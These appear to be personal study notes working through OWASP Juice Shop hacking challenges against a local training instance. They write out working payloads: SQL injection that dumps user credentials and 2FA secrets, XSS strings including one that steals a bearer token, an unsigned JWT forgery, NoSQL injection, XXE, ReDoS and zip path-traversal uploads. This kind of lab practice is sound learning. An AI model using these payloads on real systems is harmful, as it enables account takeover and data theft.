        Visit http://localhost:3000/#/forgot-password and provide bender@juice-sh.op
        
        provide Stop'n'Drop as Company you first work for as an adult
        
        change the password 
        
        * reset Uvogin's password via the forget password, social 
        
        Silence of the Lambs which is infact the correct answer to his security question
         
        * rat out a notorious character hiding in plain sight in the shop 
        
        5.png is the only PNG file among otherwise only JPGs in the customer feedback carousel
        
        use tool like e.g. http://stylesuxx.github.io/steganography/ encode a message into an image, choose the image you want to use, enter your text and hit the Encode button.
        
        or On https://incoherency.co.uk/image-steganography/#unhide nothing 
        
        use tool https://www.openstego.com/  OpenStego, the free steganography solution, data hidden, watermarking extract data 
        
        get depicts a pixelated version of Pickle Rick 
        
        Visit http://localhost:3000/#/contact
        
        submit Pickle Rick
        
        * inform the shop about a typosquatting trick it has been a victim, it is a typo from the developer who miss intall a dependency package 
        
        open the package.json.bak from the forgotten backup file challenge
        
        scrutinizing each entry in dependencies get to epilogue-js 
        
        visit http://localhost:3000/#/contact 
        
        Submit your feedback with epilogue-js in the comment 
        
            a. note, the very top. Below you can see the original epilogue NPM
        
        * retrieve a list of all user credentials via sql injection, blink sql injection 
        learned that the /rest/products/search endpoint is susceptible to SQL Injection q parameter 
        
        UNION SELECT merging the data from the user's DB table into the products returned in the JSON result.
        
        from try 
        ')) UNION SELECT '1' FROM Users-- fails with number of result columns error
        ...
        ')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM Users--
        finally gives you a JSON response back with an extra element
        {"id":"1","name":"2","description":"3","price":"4","deluxePrice":"5","image":
        "6","createdAt":"7","updatedAt":"8","deletedAt":"9"} .
        
        id of the unwanted product results changing the query into something like 
        qwert')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM Users--
        leaving only the " UNION ed"
        
        derive column name from the RESTful API results
        
        remove the replace the fixed column names, 
        use network tab of devltool to send the request from search query, qwert')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users-- 
        
        http://localhost:3000/rest/user/authentication-details also contains the user data
        
        * inform the shop about a vulnerable library it is using 
        
        Having the package.json.bak and using an online vulnerability database like Retire.js or Snyk. 
        
        open package.json 
        
        library sanitize-html : Sanitization of HTML strings is not applied recursively to input
        library express-jwt : Inherits an authentication bypass and other vulnerabilities
        
        open http://localhost:3000/#/contact submit feedback 
        
        sanitize-html and 1.4.2 or 
        express-jwt and 0.1.3 
        
        * perform a persisted XSS attack bypassing a server side security mechanism 
        
        problem introduced from sanitize-html 1.4.2 
        
        visit  http://localhost:3000/#/contact
        
        submit <<script>Foo</script>iframe src="javascript:alert( xss )"> as Comment
        
        Visit http://localhost:3000/#/about 
        Visit http://localhost:3000/#/administration for a second "xss" alert
        
        * perform a persisted XSS attack through an http header 
        
        login 
        
        visit  http://localhost:3000/#/privacy-security/last-login-ip where your IP Address probably shows as 0.0.0.0
        
        logout 
        
        login with same suer 
        
        Visit http://localhost:3000/#/privacy-security/last-login-ip again where your IP
        
        find request to request to https://localhost:3000/rest/saveLoginIp in your Browser DevTools.
        
        addding X-Forwarded-For HTTP header to spoof an arbitrary IP, e.g. 1.2.3.4 .
        
        replace the X-Forwarded-For with the proprietary header True-Client-IP
        
        response you will notice lastLoginIp: "1.2.3.4" and after logging in again you will see 1.2.3.4 as your IP Address on
        
        request once more with True-Client-IP: <iframe src="javascript:alert(``xss``)"> to solve 
        
        login in again 
        
        visit http://localhost:3000/#/privacy-security/last-login-ip
        
    + challenges xxxxx
    
        * learn about token sale before its official announcement, navigate to a secret page 
        open the main-es2015 search for keywords like "ico", "token", "bitcoin" or "altcoin"
        
        JavaScript functions where these occur in, like Vu() and Hu(l) 
        
        search for reference of those functions like zu(l) may be route name app-token-sale
        
        try navigate to http://localhost:3000/#/app-token-sale or variations http://localhost:3000/#/token-sale 
        
        search doe Vu is referenced in route mapping, search for  function Ca( to find the declaration
        
        execute it immediately by appending a () and execute in the console 
        
        path is the code block passed into the match() function inside Ca(l)
        
        append it to a string to make it work, this is the inner code of Cal()
        ```
        "" + function(){
        }(...) + 10..toString(36).toLowerCase()
        ```
        
        which will finally yield the path /tokensale-ico-ea
        
        * change bender's password into slurmCl4ssic without SQL injection and forget passowrd 
        
        login 
        
        inspect HTTP calls of the Password Change form reveals that these happen via HTTP GET
        
        try send request /rest/user/change-password on various inputs: http://localhost:3000/rest/user/change-password?current=A yields 401 
        ...
        until http://localhost:3000/rest/user/change-password?new=B&repeat=B yields a 200 success returning the updated user as JSON!
        
        login with bender with sql injection, get the Authentication Bearer token header 
        
        craft a get request to http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic
        
        * bonus round: delivering the attack via reflected XSS, change bender's password 
        
        <img src="http://localhost:3000/rest/user/change-password? new=slurmCl4ssic&repeat=slurmCl4ssic"> will not work
        
        attack URL is required:
        http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript%3Axmlhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%20xmlhttp.open%28%27GET%27%2C%20%27http%3A%2F%2Flocalhost%3A3000%2Frest%2Fuser%2Fchangepassword%3Fnew%3DslurmCl4ssic%26amp%3Brepeat%3DslurmCl4ssic%27%22589%3B%20xmlhttp.setRequestHeader%28%27Authorization%27%2C%60Bearer%3D%24%7BlocalStorage.getItem%28%27token%27%29%7D%60%29%3B%20xmlhttp.send%28%29%3B%22%3E
        
        encoded code 
        ```
        <iframe src="javascript:xmlhttp = new XMLHttpRequest(); 
            xmlhttp.open('GET', 'http://localhost:3000/rest/user/change-password?new=slurmCl4ss
            xmlhttp.setRequestHeader('Authorization',`Bearer=${localStorage.getItem('token')}`)
            xmlhttp.send();">
        </iframe>
        ```
        
        click the image link 
        
        * stick cute cross-domain kittens all over our delivery boxes 
        
        login go to http://localhost:3000/#/deluxe-membership
        
        inspect image it's a svg 
        
        search main-es2015.js for the svg component 
        
        where a property t.logoSrc is passed into some non-descriptive function five times
        
        search the class Ht definition 
        
        find this.logoSrc = "assets/public/images/JuiceShop_Logo.png"
        
        query parameter testDecal ! It seems the developers used this for testing the overlay images on the SVG but forgot to remove it before go-live
        
        Try the testDecal parameter, e.g. by going to http://localhost:3000/#/deluxemembership?testDecal=test
        
        the test will be a relative url, we can try absolute url will not work 
        
        path travel with root of the web server e.g. via http://localhost:3000/#/deluxe-membership?testDecal=..%2F..%2F..%2Ftest will be http://localhost:/3000/test 
        
        use force redirect in the previous challenge challenge susceptibility to path traversal will allow you to craft a URL like
        http://localhost:3000/#/deluxe-membership?testDecal=..%2F..%2F..%2F..%2Fredirect%3Fto%3Dhttps:%2F%2Fplacekitten.com%2Fg%2F400%2F500%3Fx%3Dhttps:%2F%2Fgithub.com%2Fbkimminich%2Fjuice-shop
        
        * dumpster dive the internet for a leaked password and log in to the original user account it belongs to 
        
        get access.log with previous challenge
        
        check the log format from public platforms like stackoverlfow etc. and recheck the access.log  
        ```
        161.194.17.103 - - [27/Jan/2019:11:18:35 +0000] "GET /rest/user/change-password?
        current=0Y8rMnww$*9VFYE%C2%A759-!Fg1L6t&6lB&new=sjss22%@%E2%82%AC55jaJasj!.k&repeat
        =sjss22%@%E2%82%AC55jaJasj!.k8 HTTP/1.1" 401 39 "http://localhost:3000/"262
        "Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X) AppleWebKit/537.36 (KHTML, like
        Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36"
        ```
        the 401 indicate change password failed. the password will still be the current one 0Y8rMnww$*9VFYE%C2%A759-!Fg1L6t&6lB
        
        try which user belong to 
            a. access the administration section of the store. try with all the users 
            
            b. hash the known password with MD5, compare the password in the list all user credentials via SQL injection challenge
            
        password belongs to J12934@juice-sh.op so using this as Email and 0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB
        
        * perform an unwanted information disclosure by accessing data cross-domain, with burp suite 
        
        request to the /rest/user/whoami, remove the authentication header still works 
        
         Add a URL parameter called "callback". This will cause the API to return the content as a JavaScript fragment (JSONP)
        
        * login with non-existing accountant without ever registering that user 
        
        goto  http://localhost:3000/#/login and try logging in with Email ' will get sql error info 
        
        with information from challenge exfiltrate the entire db schema via sql injection to learn the exact column names 
        
        Log in with Email ' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username',
        'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role',
        '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' ,
        '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret',
        1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16
        14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')
        
        * retrive the language file that never made it into product 
        
        monitor HTTP request to language files tells you how the translations are loaded:
        http://localhost:3000/i18n/en.json
        http://localhost:3000/i18n/de_DE.json
        http://localhost:3000/i18n/nl_NL.json
        http://localhost:3000/i18n/zh_CN.json
        http://localhost:3000/i18n/zh_HK.json
        ...
        
        Nonetheless, even brute forcing all thinkable locale codes ( aa_AA , ab_AA , ..., zz_ZY , zz_ZZ ) would still not solve the challenge.
        
        which is represented by a three-letter code tlh with the dummy country code AA 
        
        hidden is tlh_AA, need brute forcing all thinkable codes, finally Request http://localhost:3000/i18n/tlh_AA.json
        
        * solve the 2FA challenge for user "wurstbrot"
        
        Access the administration section of the store while inspecting network traffic, find the email of the user wurstbrot@juice-sh.op
        
        2FA configuration in the responses from /api/Users 
        
            a. additional webiste https://2fa.live/ 2 factor authentication
        
        search the all user credentials via sql injection, change the one of null in playload to find a column that contains the secret key for 2FA 
        
        http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,2fa,null,null,null,null%20from%20users-- yields a 500 error with SequelizeDatabaseError: SQLITE_ERROR: no such column: 2fa .
        
        http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totpsecret,null,null,null,null%20from%20users-- finally succeeds with a 200 response as this column exists!
        
        in the response find the entry of user wurstbrot@juice-sh.op with "image":"IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH" whereas all other users have "image":"" set.
        
        use google authenticator to get a new entry, instead of scan the QR, type in the key IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH
        
        go to and use SQL injection to log in with wurstbrot@juice-sh.op'-- as Username and anything as Password.
        
        two factor authentication input screen will present and type in the code display on your 2FA app 
        
        click login 
        
            a. additional learning https://www.investopedia.com/terms/t/twofactor-authentication-2fa.asp
            b. additional learning https://en.wikipedia.org/wiki/Multi-factor_authentication
            
        * forge an essentially unsigned JWT token 
        
        login 
        
        get the valid JWT authorization header
        
        copy JWT and decode it, everything after Bearer 
        
        change email in the JSON to jwtn3d@juice-sh.op
        
        Change the value of the alg property in the header part from HS256 to none 
        
        Encode the header to base64url. base64url makes it URL safe, a regular Base64 encode might not
            
        two strings obtained above with a . (dot symbol) and add a . at the end of the obtained string.
        base64url(header).base64url(payload)
        
        change the authorization header of a subsequent request to the retrieved JWT. prefixed with Bearer as before 
        
        * exploit oauth 2.0 to log in with chief information 
        
        login with check remember me http://localhost:3000/#/login 
        
        inspect the cookies 
        
        log out and go back to login page and make sure remember me still ticked 
        
        use ciso@juice-sh.op as Email login will failed 
        
        inspecting cookie 
        
        a new custom HTTP header X-User-Email: ciso@juice-sh.op in every request 
        
        visit login page again choose login with google or login regularly but add "oauth": true to the JSON payload
        
        visit http://localhost:3000/#/contact check the author field you will logged in ciso@juice-sh.op instead of google email 
            a. relative https://incognitjoe.github.io/hacking-the-juice-shop.html
            
        * all your orders are belong to us 
        
        open devtool 
        
        visit http://localhost:3000/#/track-order and search for x
        {"status":"success","data":[{"orderId":"x"}]}
        
        searching for '' get error  MongoDB background that the query probably
        { $where: "property === '" + payload + "'" } 
        
        search for ' || true || ' resulting in http://localhost:3000/rest/trackorder/'%20%7C%7C%20true%20%7C%7C%20' which will in fact query and return all orders from the MarsDB
        
        * perform a remote code execution that would keep a less hardened application busy forever 
        discover swagger API automated URL discovery you can find a Swagger API documentation hosted at http://localhost:3000/api-docs 
        
        Go back to the application, log in as any user and copy your token from the Authorization Bearer header 
        
        describes the B2B API.  given example for orderLinesDate indicates that this String might be allowed to contain arbitrary JSON: [{"productId": 12,"quantity": 10000,"customerReference": ["PO0000001.2", "SM20180105|042"],"couponCode": "pes[Bh.u*t"},...]
        
        Back at http://localhost:3000/api-docs/#/Order/post_orders click Authorize and paste your token 
        
        JSON deserialization would execute any function call defined within the JSON String, so a possible payload for a DoS attack. server will response roughly 2 seconds 
        
        * reset the password of bjoern's internal account via the forgot password mechanism, social, not completed 
        
        Your ZIP/postal code when you were a teenager? into West-2082 and click Change again
        
            a. country post code berlin 
            
        * reset morty's password via forget password, social, not completed
        
        sends well-formed requests to http://localhost:3000/rest/user/reset-password . A rate limiting mechanism will prevent you from sending more than 100 requests within 5 minutes
        
        * deprive the shop of earnings by downloading the blueprint for one of its products 
        
        product image from http://localhost:3000/public/images/products/3d_keychain.jpg and view its Exif metadata 
        
        image works with .stl files 
        
        As no further hint on the blueprint filename or anything is given, a lucky guess or brute force attack is your only choice 
        
        iterate craft requests till http://localhost:3000/public/images/products/JuiceShop.stl
        
        * inform the development team about a danger to some of their credentials 
        
        * informa the shop about a typoquatting imposter that dug itself deep into the frontend 
        
        Request http://localhost:3000/3rdpartylicenses.txt to retrieve the 3rd party
        
        come across anuglar2-qrcode which openly reveals its intent on https://www.npmjs.com/package/anuglar2-qrcode
        
        Visit http://localhost:3000/#/contact
        
        Submit your feedback with anuglar2-qrcode 
        
        * give server something to chew on for quite a while 
        
        reference challenge b2b interface that was not properly shutdown, to upload xml 
        
        linux <!ENTITY xxe SYSTEM "file:///dev/random"> 
        
        window consisting of a single large entity like <!ENTITY a "dosdosdosdos...dos" > 
        
        xml billion laughs attack will not work as the parser is optimized 
        
        * permanently disable the support chatbot 
        
    + challenges xxxxxx 
    
        * overwrite the legal information file 
        
        need to override lives in http://localhost:3000/ftp/legal.md and uploading files via File Complaint
        
        prepare a zip file with linux 
        $ zip exploit.zip ../ftp/legal.md 
        
        login 
        
        type any message and attach your zip and click submit  
        
        repeat login and  upload with zip exploit.zip ../../ftp/legal.md as the payload
        
        legal information will be replaced 
        
        * pattern analysis solution path, brute force 
        
        * reverse engineering solution path 
        
        * cloud computing solution path 
        
        * solve challenge #999, duplicated log 
        
        * forget an almost properly RSA-signed JWT token with burp suite, Burp Suite find and install the JSON Web Token Attacker extension (aka JOSEPH)
        
        * with linux online tools 
        
        * like any review at least three times as the same user 
        
         request to http://localhost:3000/rest/products/reviews which associates the email of the user with the review (identified by the JSON body of e.g. {id: "ZQdzyRCbwQ4ys3PCG"} ) and also increases its like counter by one
         
         script that simultaneously executes three requests to http://localhost:3000/rest/products/reviews with body e.g. {id: "ZQdzyRCbwQ4ys3PCG"} and run it
         
        * log in with support team's original user credentials 
        
        * unlock premium challenge to access exclusive content 
        
        open html with devtool Score Board table reveals a HTML comment that is obviously encrypted: <!--IvLuRfBJYlmStf9XfL6ckJFngyd9LfV1JaaN/KRTPQPidTuJ7FR+D/nkWJUF+0xUF07CeCeqYfxq+OJVVa0gNbqgYkUNvn//UbE7e95C+6e+7GtdpqJ8mqm4WcPvUGIUxmGLTTAC2+G9UuFCD1DUjg==--> .
        
        AES-encryption using AES256 in CBC mode.
        
        OWASP ZAP for this purpose
        
        not complete 
        
        * perform a remote code execution that occupies the server for a while without infinite loops 
        
        Request Body put in {"orderLinesData": "/((a+)+)b/.test('aaaaaaaaaaaaaaaaaaaaaaaaaaaaa')"} - which will trigger a very costly Regular Expression test once executed
        
        * request a hidden resource on server through server 
        
        * infect the server with juicy malware by abusing arbitrary command execution 
        
        * embed an XSS payload into our promo video 
        
        
- not completed to whole books 
        
- download burn suite 

Burp Suite, https://portswigger.net/burp

- xss reference 2021  

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet


# Microfocus challenges 
- security issue 
Aes.Ctr.encrypt(plaintext, 6d3d2786-76ba-4a, 128)

    plaintext = utf8.encode(plaintext)
    password = utf8.encode(password)
    
    
    keyschedule = Aes.keyExpansion(key)
    
    chiperCntr = Aes.cipher(counterBlock, keySchedule)
    
    xor plaintext with chiper
    
    ciphertext = string(ciphertext)
    
    return chipertext 
    
    
   












